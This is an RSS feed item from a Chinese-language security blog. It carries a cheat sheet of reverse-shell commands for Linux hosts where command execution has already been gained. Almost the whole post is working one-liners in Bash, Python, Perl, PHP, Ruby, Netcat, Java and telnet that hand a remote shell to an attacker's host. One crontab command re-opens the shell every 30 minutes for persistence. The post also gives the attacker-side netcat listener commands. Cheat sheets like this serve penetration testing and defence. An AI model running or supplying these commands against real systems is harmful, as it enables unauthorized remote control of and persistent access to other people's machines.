<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Shell on </title>
    <link>http://wyb0.com/tags/shell/</link>
    <description>Recent content in Shell on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Sat, 06 Aug 2016 08:36:53 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/shell/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Linux下反弹shell</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</guid>
      <description>

&lt;p&gt;当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令&lt;/p&gt;

&lt;h3 id=&#34;0x00-bash:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x00 Bash&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1
注：这个由解析shell的bash完成，有些时候不支持
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x01-crontab:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x01 crontab&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;下面这条命令执行后会每隔30分钟反弹一次：
(crontab -l;printf &amp;quot;*/30 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/10.10.10.10/8888;exec 0&amp;lt;&amp;amp;9;
exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&amp;quot;)|
crontab -
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x02-python:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x02 Python&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# 下面为1条命令
python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect((&amp;quot;10.10.10.10&amp;quot;,8888));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x03-perl:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x03 Perl&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
perl -e &#39;use Socket;$i=&amp;quot;10.10.10.10&amp;quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,
getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x04-php:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x04 PHP&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;10.10.10.10&amp;quot;,8888);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x05-ruby:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x05 Ruby&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.10.10.10&amp;quot;,8888).to_i;
exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x06-netcat:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x06 Netcat&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;nc -e /bin/sh 10.10.10.10 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x07-java:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x07 Java&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为3条命令
r = Runtime.getRuntime()
p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.10.10.10/8888;cat &amp;lt;&amp;amp;5 | 
while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[])
p.waitFor()
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x08-telnet:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x08 telnet&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;两种方法：
mknod backpipe p &amp;amp;&amp;amp; telnet 173.214.173.151 8080 0backpipe
telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
第一种hacker运行：nc -vlp 8080
第二种hacker运行：nc -vlp 8080和nc -vlp 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
参考文章：&lt;br /&gt;
&lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://www.91ri.org/6620.html&#34;&gt;https://www.91ri.org/6620.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>